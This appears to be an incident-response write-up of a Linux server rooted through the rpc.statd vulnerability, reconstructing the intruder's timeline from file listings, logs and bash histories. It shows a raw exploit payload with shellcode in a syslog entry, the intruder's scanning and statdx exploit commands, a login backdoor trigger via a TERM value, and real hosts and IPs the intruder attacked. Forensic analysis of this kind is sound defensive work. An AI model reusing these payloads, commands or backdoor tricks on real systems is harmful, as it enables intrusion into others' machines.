@@ -1,0 +1,255 @@
+***** First, let's take a look at recently-modified directories *****
+
+[root@c460329-a /]# ls -lart /
+total 73
+drwxr-xr-x  18 root     root         4096 Dec 31  1969 Win98
+drwxr-xr-x   2 root     root        12288 Jul 17  1999 lost+found
+drwxr-xr-x   4 root     root         1024 Jul 17  1999 mnt
+drwxr-xr-x   4 root     root         3072 Jul 17  1999 lib
+drwx------   2 root     root         1024 Jul 17  1999 .gnome_private
+drwx------   3 root     root         1024 Jul 17  1999 .gnome
+drwxr-xr-x   6 root     root         1024 Jul 17  1999 home
+drwxr-xr-x  21 root     root         1024 Sep  1  1999 usr
+drwxr-xr-x  17 root     root         1024 Apr 10 10:44 var
+drwxr-xr-x   3 root     root         2048 Apr 10 10:44 sbin
+drwxr-xr-x   2 root     root         1024 Aug  7 18:30 boot
+dr-xr-xr-x  78 root     root            0 Sep  2 19:54 proc
+drwxr-xr-x   2 root     root            0 Sep  3 00:54 auto
+drwxr-xr-x   2 root     root         2048 Sep  9 06:57 bin
+-rw-r--r--   1 root     root           32 Sep  9 23:53 .rhosts
+drwxr-x---  20 root     root         1024 Sep 10 00:02 root
+drwxr-xr-x  34 root     root         3072 Sep 10 00:03 etc
+drwxr-xr-x   6 root     root        34816 Sep 10 00:12 dev
+drwxr-xr-x  20 root     root         1024 Sep 10 00:15 ..
+drwxr-xr-x  20 root     root         1024 Sep 10 00:15 .
+drwxrwxrwt   7 root     root         1024 Sep 10 00:15 tmp
+
+
+ls -lart /bin
+[snip]
+-rwxr-xr-x   1 524      524          5732 Mar 26 18:23 login
+-r-xr-xr-x   1 508      509         39338 Aug  3 19:56 ps
+drwxr-xr-x   2 root     root         2048 Sep  9 06:57 .
+drwxr-xr-x  20 root     root         1024 Sep 10 00:15 ..
+
+ls -lart /root
+[snip]
+-rw-------   1 root     root         1120 Sep  9 23:50 .bash_history
+-rw-------   1 root     root          174 Sep 10 00:02 .Xauthority
+drwxr-x---  20 root     root         1024 Sep 10 00:02 .
+drwxr-xr-x  20 root     root         1024 Sep 10 00:15 ..
+
+ls -lart /etc
+[snip]
+drwxr-xr-x   4 root     root         1024 Sep  9 07:14 .tmp
+-rw-------   1 root     root          512 Sep  9 17:54 ssh_random_seed
+-rw-rw-r--   1 root     root        12288 Sep  9 23:12 psdevtab
+-rw-r--r--   1 root     root          683 Sep 10 00:02 passwd-
+-rw-r--r--   1 root     root          683 Sep 10 00:03 passwd
+drwxr-xr-x  34 root     root         3072 Sep 10 00:03 .
+drwxr-xr-x  20 root     root         1024 Sep 10 00:15 ..
+
+[root@c460329-a /]# ls -lart /etc/.tmp
+total 42
+-rw-r--r--   1 root     root        21131 Sep  9 06:56 chuma.tar.gz
+drwxr-xr-x   2 root     root         1024 Sep  9 06:57 chuma-patch
+-rw-r--r--   1 root     root        13064 Sep  9 07:14 strife-statdx.tar.gz
+drwxr-xr-x   4 root     root         1024 Sep  9 07:14 .
+drwxr-xr-x   2 1000     1000         1024 Sep  9 07:42 statdx-scan
+drwxr-xr-x  34 root     root         3072 Sep 10 00:03 ..
+
+[root@c460329-a /]# ls -lart /etc/.tmp/chuma-patch
+total 4
+-rwxr-xr-x   1 root     root         1556 Sep  3 23:11 install
+drwxr-xr-x   4 root     root         1024 Sep  9 07:14 ..
+drwxr-xr-x   2 root     root         1024 Sep 10 00:24 .
+
+[root@c460329-a /]# ls -lart /etc/.tmp/statdx-scan
+total 123
+-rwxr-xr-x   1 1000     1000         1441 Aug  9 23:32 ben.c
+-rwxr-xr-x   1 1000     1000         4444 Aug  9 23:42 pscan.c
+-rwxr-xr-x   1 root     root        21184 Aug  9 23:43 statdx
+-rwxr-xr-x   1 root     root          112 Aug 10 15:50 osscan
+-rwxr-xr-x   1 root     root        13156 Aug 10 16:13 .os
+-rwxr-xr-x   1 root     root          109 Aug 10 16:23 .bla
+drwxr-xr-x   4 root     root         1024 Sep  9 07:14 ..
+-rwxr-xr-x   1 root     root        13019 Sep  9 07:14 ben
+-rwxr-xr-x   1 root     root        15667 Sep  9 07:14 psc
+-rw-r--r--   1 root     root         5766 Sep  9 07:41 statdx.log
+-rw-r--r--   1 root     root        38572 Sep  9 08:08 os.log
+drwxr-xr-x   2 1000     1000         1024 Sep 10 00:27 .
+
+ls -lart /dev
+[snip]
+-rw-r--r--   1 root     root           18 Sep  9 06:57 ptyp
+drwxr-xr-x   2 root     root         1024 Sep  9 06:57 .backup
+crw-rw-rw-   1 root     root       5,   0 Sep  9 07:13 tty
+drwxr-xr-x   6 root     root        34816 Sep 10 00:12 .
+drwxr-xr-x  20 root     root         1024 Sep 10 00:15 ..
+crw-rw-rw-   1 root     root       5,   2 Sep 10 00:28 ptmx
+
+[root@c460329-a /]# ls -lart /dev/.backup
+total 118
+-r-xr-xr-x   1 root     root        60460 Apr  3  1999 ps
+-rwsr-xr-x   1 root     root        20164 Sep  9 06:57 login
+drwxr-xr-x   2 root     root         1024 Sep  9 06:57 .
+drwxr-xr-x   6 root     root        34816 Sep 10 00:12 ..
+
+[root@c460329-a /]# ls -lart /tmp
+total 22
+drwx------   2 root     root         1024 Aug 22  1999 orbit-root
+drwx------   2 jms      users        3072 Sep 17  1999 orbit-jms
+drwxrwxrwt   2 root     root         1024 Sep 17  1999 .ICE-unix
+drwxrwxrwt   2 xfs      xfs          1024 Sep  3 00:54 .font-unix
+drwxrwxrwx   2 root     root         1024 Sep  3 00:54 .X11-unix
+-r--r--r--   1 root     root           11 Sep  3 00:54 .X0-lock
+-rw-rw-r--   1 jms      users       12288 Sep  9 06:59 psdevtab
+drwxr-xr-x  20 root     root         1024 Sep 10 00:15 ..
+drwxrwxrwt   7 root     root         1024 Sep 10 00:15 .
+
+***** Here's what got logged in /var/log/messages *****
+[snip]
+Sep  9 06:55:26 c460329-a ftpd[4350]: FTP session closed
+Sep  9 06:55:52 c460329-a
+Sep  9 06:55:52 c460329-a syslogd: Cannot glue message parts together
+Sep  9 06:55:52 c460329-a 173>Sep  9 06:55:52 rpc.statd[444]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Y÷ÿ¿^Y÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿^[÷ÿ¿^[÷ÿ¿bffff74c 804985090909090687465676274736f6d616e797265206520726f7220726f66                 
+                                                                                                         bffff718                                                                                                                                 bffff719  bffff71a                                                              
+                bffff71b~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P
+Sep  9 06:55:52 c460329-a ~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P1Àë|Y~IA^P~IA^HþÀ~IA^D~IÃþÀ~I^A°fÍ~@³^B~IY^LÆA^N~YÆA^H^P~II^D~@A^D^L~H^A°fÍ~@³^D°fÍ~@³^E0À~HA^D°fÍ~@~IÎ~HÃ1É°?Í~@þÁ°?Í~@þÁ°?Í~@Ç^F/binÇF^D/shA0À~HF^G~Iv^L~MV^P~MN^L~Ió°^KÍ~@°^AÍ~@è^?ÿÿÿ
+Sep  9 06:57:26 c460329-a kernel: proc_file_unlink: deleting net/tcp
+Sep  9 06:57:26 c460329-a kernel: remove_proc_entry: net/tcp busy, count=1
+Sep  9 06:57:26 c460329-a kernel: de_put: deferred delete of tcp
+Sep  9 06:59:49 c460329-a PAM_pwdb[4391]: (su) session opened for user jms by (uid=0)
+[snip a bunch of identd connections from IRC servers]
+
+***** Now let's look at the contents of some files *****
+[root@c460329-a /]# cat /root/.bash_history
+cd /etc/.tmp
+ls
+cd /home
+ls
+w
+cd httpd
+ls
+cd html
+cat index.html
+cd ..
+cd ..
+su jms
+cd /etc/.tmp
+ls
+ftp ftp.xoom.com
+tar -zxvf st*
+cd st*
+gcc -o ben ben.c
+gcc -o psc pscan.c
+./psc 209 111 ; ./osscan 
+cat os.log | grep wu
+./rh -d 0 patty.rackle.com
+less /var/log/messages
+passwd root
+passwd
+less /var/log/messages
+cat /var/log/messages
+Sep  9 07:12:57 c460329-a identd[6289]: Returned: 3067 , 6667 : NO-USER
+Sep  9 07:13:01 c460329-a identd[6290]: Connection from tiger.sph.emory.edu
+Sep  9 07:13:01 c460329-a identd[6290]: from: 170.140.4.6 ( tiger.sph.emory.edu ) for: 3068, 6667
+Sep  9 07:13:01 c460329-a identd[6290]: Returned: 3068 , 6667 : NO-USER
+Sep  9 07:13:22 c460329-a PAM_pwdb[4391]: (su) session closed for user jms
+cd /etc/.tmp
+ls
+cd st*
+cat os.log | grep wu
+./rh -d 0 patty.rackle.com
+./statdx -d 0 patty.rackle.com
+cat /var/log/messages
+export TERM=b10nic87
+telnet 63.224.17.26
+telnet 64.45.59.192
+ls
+cd /var/log
+less messages
+grep identd'.*'from messages
+last | less
+w
+ps -x
+export TERM=b10nic87
+telnet teensland.com
+export DISPLAY=termtype
+telnet teensland.com
+export TERM=termtype
+telnet teensland.com
+
+[root@c460329-a /]# cat ~jms/.bash_history
+ls
+ps -x
+mkdir ".. "
+cd
+mkdir ".. "
+mkdir ". "
+ls
+ls
+cd ".. "
+rm -rf ~/.bash_history
+ftp ftp.bitchx.com
+df -h
+tar -zxvf *
+cd BitchX
+./configure
+make
+cd source
+cp BitchX ../../; cp scr-bx ../../
+cp BitchX ../../bx; cp scr-bx ../../
+BitchX
+cd ../../
+./bx irc.mcs.net
+./bx irc.emory.edu
+rm -rf ~/.bash_history
+exit
+
+
+***** At this point, we have a pretty good idea of what is going on *****
+06:55:26 ftpd[4350]: FTP session closed
+06:55:52 exploited the rpc.statd vulnerability to get root
+
+	created the directory /etc/.tmp and downloaded chuma.tar.gz
+	unzipped the chuma package into /etc/.tmp/chuma-patch
+06:57	ran the script /etc/.tmp/chuma-patch/install:
+	installed the login backdoor, but didn't complete the script
+06:57:26 ran part 2 of the script, which removed logs
+	completed the script to install a trojan ps
+
+	took a look in /home, and checked out the webpages
+06:59:49 su to jms (name gathered from /home directory listing and w
+	created the directory ".. " in ~jms (twice)
+	created the directory ". " in ~jms
+	cd to "~jms/.. "
+	rm -rf ~/.bash_history (thought he killed his current session, but it doesn't save till you exit the shell)
+	ftp ftp.bitchx.com
+07:04	downloaded the file ircii-pana-75p3.tar.gz
+	df -h (making sure he has space for this)
+07:06-07:08 uncompresses BitchX and builds it from source
+	runs BitchX
+	runs bx to irc.mcs.net
+	runs bx to irc.emory.edu
+	tries to remove ~/.bash_history again
+07:13	exits back to root (and therefore saves ~/.bash_history)
+	goes back to /etc/.tmp
+07:14	ftp's over strife-statdx.tar.gz from ftp.xoom.com
+07:14	unpacks the scanner and compiles it
+	runs psc 209 111 (to scan the 209/8 on port 111)
+	also runs osscan
+	greps os.log for wu (discovers patty.rackle.com 209.218.0.226)
+	./rh -d 0 patty.rackle.com  (unfortunately we don't know what ./rh is!)
+	./statdx -d 0 patty.rackle.com  (the -d 0 identifies this as a RedHat 6.2 system)
+	Uses the backdoor to go back to some other machines:
+		export TERM=b10nic87
+		telnet 63.224.17.26
+		telnet 64.45.59.192
+		export TERM=b10nic87
+		telnet teensland.com	(porn site)
+		export DISPLAY=termtype
+		telnet teensland.com
+		export TERM=termtype
+		telnet teensland.com
+08:08	last update to /etc/.tmp/statdx-scan/os.log
